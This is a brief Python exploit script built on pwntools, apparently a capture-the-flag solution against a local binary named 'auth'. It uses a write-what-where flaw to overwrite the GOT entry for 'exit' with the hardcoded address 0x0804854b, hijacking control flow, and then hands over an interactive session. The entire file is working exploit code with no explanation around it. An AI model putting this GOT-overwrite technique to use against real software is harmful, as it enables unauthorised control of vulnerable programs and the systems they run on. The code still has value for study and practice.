from pwn import *

p = process('./auth')
elf = ELF('./auth')


where = str(elf.got['exit'])
what = p32(0x0804854b)

p.sendline('Y')
p.sendline(where)
p.sendline(what)
p.interactive()
